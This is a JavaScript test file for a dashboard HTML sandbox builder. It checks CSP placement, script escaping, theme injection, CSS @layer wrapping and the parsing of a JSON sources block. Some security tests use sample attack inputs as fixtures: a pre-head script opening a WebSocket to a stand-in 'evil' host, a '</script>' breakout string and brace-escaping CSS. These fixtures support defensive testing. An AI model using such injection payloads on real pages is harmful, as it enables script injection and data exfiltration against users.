import { test } from "node:test"
import assert from "node:assert/strict"
import { buildSrcdoc, parseSourcesBlock, CSP_META, RUNTIME_JS } from "./dashboardSrcdoc.js"

// A stable marker that only appears where the runtime was inlined.
const RUNTIME_MARK = "window.jarvis = {"

// Every case is re-wrapped in OUR shell; author head/body inner is extracted,
// the CSP meta is always the literal first head child, and author content only
// ever lands inside <head>/<body> AFTER our runtime.
test("full document with <head>: re-wrapped, CSP first, head/body inner preserved", () => {
  const out = buildSrcdoc("<!DOCTYPE html><html><head><title>t</title></head><body>USER</body></html>", {})
  const head = out.indexOf("<head>")
  assert.ok(out.startsWith("<!DOCTYPE html><html"))
  // CSP is the FIRST head child (immediately after the opening head tag)
  assert.equal(out.indexOf(CSP_META), head + "<head>".length)
  // author head + body content are preserved, but AFTER the runtime
  assert.ok(out.includes("<title>t</title>"))
  assert.ok(out.includes("<body>USER</body>"))
  assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("<title>t</title>"))
  assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"))
})

test("<html> but no <head>: re-wrapped, CSP first, body preserved", () => {
  const out = buildSrcdoc('<html lang="en"><body>USER</body></html>', {})
  const head = out.indexOf("<head>")
  assert.ok(out.startsWith("<!DOCTYPE html><html"))
  assert.equal(out.indexOf(CSP_META), head + "<head>".length)
  assert.ok(out.includes("<body>USER</body>"))
  assert.ok(out.indexOf("</head>") < out.indexOf("USER"))
  assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"))
})

test("fragment: doctype stripped, skeleton wrap, charset present, CSP first", () => {
  const out = buildSrcdoc("<!doctype html>\n<div>USER</div>", {})
  assert.ok(out.startsWith("<!DOCTYPE html><html"))
  // the leading user doctype was stripped (only our own remains)
  assert.equal(out.match(/<!doctype/gi).length, 1)
  const head = out.indexOf("<head>")
  assert.equal(out.indexOf(CSP_META), head + "<head>".length)
  // charset comes right after the CSP
  assert.equal(out.indexOf('<meta charset="utf-8">'), head + "<head>".length + CSP_META.length)
  assert.ok(out.includes("<body><div>USER</div></body>"))
  assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"))
})

test("charset is always present (fragment or full doc, since we always wrap)", () => {
  assert.ok(buildSrcdoc("<html><head></head><body></body></html>", {}).includes('<meta charset="utf-8">'))
  assert.ok(buildSrcdoc("<div>x</div>", {}).includes('<meta charset="utf-8">'))
})

test("SECURITY: a <script> before <head> is dropped, never runs pre-CSP", () => {
  // The exploit: author markup before <head> executes during 'before head'
  // parsing, BEFORE our injected CSP meta. We must drop it entirely.
  const evil =
    '<html><script>window.__PWNED=new WebSocket("wss://evil/x")</script>' +
    "<head><title>ok</title></head><body>USER</body></html>"
  const out = buildSrcdoc(evil, {})
  const csp = out.indexOf(CSP_META)
  // the malicious pre-head script must not survive at all
  assert.ok(!out.includes("__PWNED"), "pre-head script must be dropped")
  assert.ok(!out.includes('new WebSocket("wss://evil/x")'))
  // and nothing whatsoever precedes the CSP except our own shell head
  assert.ok(out.slice(0, csp).indexOf("<script") < 0, "no script before the CSP meta")
  // legitimate head/body content survives (after the runtime)
  assert.ok(out.includes("<title>ok</title>"))
  assert.ok(out.includes("<body>USER</body>"))
})

test("runtime script precedes user markup in all three cases", () => {
  for (const html of [
    "<html><head></head><body><p>USER</p></body></html>",
    "<html><body><p>USER</p></body></html>",
    "<p>USER</p>",
  ]) {
    const out = buildSrcdoc(html, {})
    assert.ok(out.indexOf(RUNTIME_MARK) < out.indexOf("USER"), `runtime after markup for: ${html}`)
  }
})

test("</script> in inlined sources is escaped so the wrapper cannot terminate early", () => {
  const evil = 'console.log("</script><img src=x>")'
  const out = buildSrcdoc("<div>ok</div>", { echartsSource: evil })
  assert.ok(out.includes('console.log("<\\/script><img src=x>")'))
  // the only raw </script> occurrences are our own wrapper closers (2 scripts)
  assert.equal(out.match(/<\/script>/g).length, 2)
})

test("runtime itself carries no unescaped </script>", () => {
  assert.ok(!/<\/script/i.test(RUNTIME_JS))
})

test("echarts toggle: absent by default, present (before the runtime) when passed", () => {
  const without = buildSrcdoc("<div></div>", {})
  assert.ok(!without.includes("ECHARTS_SRC"))
  const withE = buildSrcdoc("<div></div>", { echartsSource: "/*ECHARTS_SRC*/" })
  assert.ok(withE.includes("/*ECHARTS_SRC*/"))
  assert.ok(withE.indexOf("/*ECHARTS_SRC*/") < withE.indexOf(RUNTIME_MARK))
  assert.ok(withE.indexOf(CSP_META) < withE.indexOf("/*ECHARTS_SRC*/"))
})

test("theme attribute: set in all cases, replaced when already present", () => {
  // fragment
  assert.ok(buildSrcdoc("<p>x</p>", { dark: true }).includes('<html data-theme="dark">'))
  assert.ok(buildSrcdoc("<p>x</p>", { dark: false }).includes('<html data-theme="light">'))
  // full doc without the attr
  const a = buildSrcdoc("<html><head></head><body></body></html>", { dark: true })
  assert.ok(/<html[^>]*data-theme="dark"[^>]*>/.test(a))
  // existing attr replaced, not duplicated
  const b = buildSrcdoc('<html data-theme="light"><head></head><body></body></html>', { dark: true })
  assert.ok(b.includes('data-theme="dark"'))
  assert.ok(!b.includes('data-theme="light"'))
  // html-no-head case too
  const c = buildSrcdoc("<html><body></body></html>", { dark: true })
  assert.ok(/<html[^>]*data-theme="dark"[^>]*>/.test(c))
})

test("parseSourcesBlock: reads the #jarvis-sources block; tolerates absence + bad JSON", () => {
  const html =
    '<div></div><script type="application/json" id="jarvis-sources">' +
    '{"sources":[{"source_name":"overdue","tool":"query","spec":{"q":1}},{"tool":"query"}]}' +
    "</script>"
  const sources = parseSourcesBlock(html)
  assert.equal(sources.length, 1) // the entry without source_name is dropped
  assert.deepEqual(sources[0], { source_name: "overdue", tool: "query", spec: { q: 1 } })
  assert.deepEqual(parseSourcesBlock("<div>none</div>"), [])
  assert.deepEqual(
    parseSourcesBlock('<script type="application/json" id="jarvis-sources">{oops</script>'),
    [],
  )
})

test("parseSourcesBlock: normalizes the LLM tool-call dialect (id / jarvis__ prefix / args.spec)", () => {
  const html =
    '<script type="application/json" id="jarvis-sources">' +
    '{"sources":[' +
    '{"id":"monthly_sales","tool":"jarvis__query","refresh":"view","args":{"spec":{"from":"Sales Invoice"}}},' +
    '{"name":"top5","tool":"jarvis__run_report","args":{"report_name":"Foo","filters":{"a":1}}}' +
    "]}</script>"
  const sources = parseSourcesBlock(html)
  assert.equal(sources.length, 2)
  assert.deepEqual(sources[0], {
    source_name: "monthly_sales",
    tool: "query",
    spec: { from: "Sales Invoice" },
  })
  assert.deepEqual(sources[1], {
    source_name: "top5",
    tool: "run_report",
    spec: { report_name: "Foo", filters: { a: 1 } },
  })
})

test("RUNTIME_JS: contains the same dialect normalization", () => {
  assert.ok(RUNTIME_JS.includes("jarvis__"))
  assert.ok(RUNTIME_JS.includes("s.args"))
})

test("buildSrcdoc: named theme injects vars + JARVIS_THEME and owns data-theme", async () => {
  const { THEMES } = await import("./dashboardThemes.js")
  const out = buildSrcdoc("<html><head></head><body><p>x</p></body></html>", {
    theme: THEMES.jarvis,
  })
  assert.ok(out.includes('<style id="jarvis-theme">'))
  assert.ok(out.includes("--jd-bg:"))
  assert.ok(out.includes("window.JARVIS_THEME="))
  assert.ok(out.includes('"name":"jarvis"'))
  assert.ok(/<html[^>]*data-theme="light"/.test(out))
  // theme style must precede the runtime so vars exist before user scripts
  assert.ok(out.indexOf('id="jarvis-theme"') < out.indexOf("window.jarvis ="))
  // a dark theme drives data-theme
  const dark = buildSrcdoc("<p>x</p>", { theme: THEMES.graphite })
  assert.ok(dark.includes('data-theme="dark"'))
  // no theme → legacy dark flag behavior unchanged
  const legacy = buildSrcdoc("<p>x</p>", { dark: true })
  assert.ok(legacy.includes('data-theme="dark"'))
  assert.ok(!legacy.includes("jarvis-theme"))
})

test("parseSourcesBlock: unwraps double-nested spec ({spec:{spec:{...}}})", () => {
  const html =
    '<script type="application/json" id="jarvis-sources">' +
    '{"sources":[{"source_name":"m","tool":"query","spec":{"spec":{"from":"Sales Invoice"}}}]}' +
    "</script>"
  const sources = parseSourcesBlock(html)
  assert.deepEqual(sources[0].spec, { from: "Sales Invoice" })
})

test("@layer: a standard theme wraps author <style> in @layer author and wins via @layer theme", async () => {
  const { THEMES } = await import("./dashboardThemes.js")
  const html =
    "<html><head><style>.jd-card{background:#0f172a}</style></head><body><p>x</p></body></html>"
  const out = buildSrcdoc(html, { theme: THEMES.jarvis })
  // The theme block declares layer order author-before-theme; in CSS @layer the
  // LAST-listed layer wins, so `author, theme` => theme beats author regardless
  // of the author's source order or specificity.
  assert.ok(out.includes("@layer author, theme;"), "layer order declaration present")
  assert.ok(out.includes("@layer theme{"), "theme base emitted in @layer theme")
  // the author's own <style> content is wrapped in @layer author (the loser)
  assert.ok(
    out.includes("@layer author{.jd-card{background:#0f172a}}"),
    "author <style> wrapped in @layer author",
  )
  // the theme layer carries the tokens, so a jd-card in @layer theme wins color
  assert.ok(out.indexOf("@layer theme{") < out.indexOf("--jd-bg:"))
})

test("@layer: multiple author <style> blocks are each wrapped; empty ones untouched", async () => {
  const { THEMES } = await import("./dashboardThemes.js")
  const html =
    "<head><style>.a{color:var(--jd-ink)}</style></head>" +
    "<body><style></style><style>.b{color:var(--jd-accent)}</style><p>x</p></body>"
  const out = buildSrcdoc(html, { theme: THEMES.insight })
  assert.ok(out.includes("@layer author{.a{color:var(--jd-ink)}}"))
  assert.ok(out.includes("@layer author{.b{color:var(--jd-accent)}}"))
  // an empty <style></style> is left as-is (no pointless @layer author{})
  assert.ok(out.includes("<style></style>"))
})

test("@layer: an UNCLOSED author <style> is still wrapped in @layer author (F2)", async () => {
  const { THEMES } = await import("./dashboardThemes.js")
  // no </style>: the browser applies the CSS to EOF, so it must be layered too or
  // it beats @layer theme unlayered. We wrap it AND synthesize a closing tag.
  const out = buildSrcdoc("<body><style>.k{color:#0f172a}</body>", { theme: THEMES.jarvis })
  assert.ok(
    out.includes("@layer author{.k{color:#0f172a}}</style>"),
    "unclosed author style wrapped in @layer author and closed",
  )
  // the theme still declares author-before-theme + emits its own theme layer,
  // so the theme wins the cascade over the now-layered author CSS
  assert.ok(out.includes("@layer author, theme;"), "layer order declaration present")
  assert.ok(out.includes("@layer theme{"), "theme layer still emitted")
})

test("@layer: malformed author CSS with a stray } cannot break out to outrank @layer theme (F#4)", async () => {
  const { THEMES } = await import("./dashboardThemes.js")
  // A LEADING stray } would close @layer author{} immediately, leaving .jd-card
  // UNLAYERED and beating @layer theme. The wrapper must NOT emit it unlayered.
  const out = buildSrcdoc("<body><style>}.jd-card{color:var(--jd-negative)}</style></body>", {
    theme: THEMES.jarvis,
  })
  // the theme layer machinery is intact (theme still wins for well-formed CSS)
  assert.ok(out.includes("@layer author, theme;"), "layer order declaration present")
  assert.ok(out.includes("@layer theme{"), "theme layer emitted")
  // the malicious author rule is dropped — never emitted unlayered, so it cannot
  // outrank the theme (and it never rode inside @layer author either)
  assert.ok(
    !out.includes(".jd-card{color:var(--jd-negative)}"),
    "stray-} author rule dropped, not emitted unlayered",
  )
  assert.ok(!/@layer author\{\}/.test(out), "no empty-then-escaped @layer author remains")
  // EXCESS trailing } (closes @layer author early, then .after would be unlayered)
  const out2 = buildSrcdoc(
    "<body><style>.evil{color:var(--jd-negative)}} .after{color:var(--jd-accent)}</style></body>",
    { theme: THEMES.jarvis },
  )
  assert.ok(!out2.includes("@layer author{.evil"), "excess-} block not wrapped")
  assert.ok(!/\}\s*\.after\s*\{/.test(out2), "nothing left unlayered after the excess }")
  // a WELL-FORMED author block under the same theme is still wrapped + layered
  const ok = buildSrcdoc("<body><style>.jd-card{color:#0f172a}</style></body>", { theme: THEMES.jarvis })
  assert.ok(ok.includes("@layer author{.jd-card{color:#0f172a}}"), "well-formed CSS still wrapped")
})

test("@layer: Custom (bespoke) theme does NOT wrap author styles — author design wins", async () => {
  const { THEMES } = await import("./dashboardThemes.js")
  const html = "<style>.jd-card{background:#0f172a}</style><p>x</p>"
  const out = buildSrcdoc(html, { theme: THEMES.custom })
  // author CSS stays unlayered (unwrapped) so the bespoke look wins
  assert.ok(out.includes(".jd-card{background:#0f172a}"))
  assert.ok(!out.includes("@layer author{"), "no author layer for bespoke")
  assert.ok(!out.includes("@layer theme{"), "no theme layer for bespoke")
  // tokens are still injected (unlayered) so var(--jd-*) resolves, and the
  // palette global is present
  assert.ok(out.includes("--jd-bg:"))
  assert.ok(out.includes('"name":"custom"'))
})

test("@layer: no-theme (legacy dark flag) path is unchanged — no layers, no theme block", () => {
  const out = buildSrcdoc("<style>.a{color:red}</style><p>x</p>", { dark: true })
  assert.ok(!out.includes("@layer"), "no @layer without a theme")
  assert.ok(!out.includes("jarvis-theme"))
  assert.ok(out.includes(".a{color:red}"), "author style passed through verbatim")
  assert.ok(out.includes('data-theme="dark"'))
})

test("SECURITY: stale openclaw ws-client script is stripped, other scripts kept", () => {
  const html =
    "<html><head></head><body><div id=chart></div>" +
    "<script>renderChart()</script>" +
    '<script>const ws=new WebSocket("ws://"+location.host+"/__openclaw__/ws");</script>' +
    "</body></html>"
  const out = buildSrcdoc(html, {})
  assert.ok(out.includes("renderChart()"), "legit script kept")
  assert.ok(!out.includes("__openclaw__/ws"), "host ws-client stripped")
})
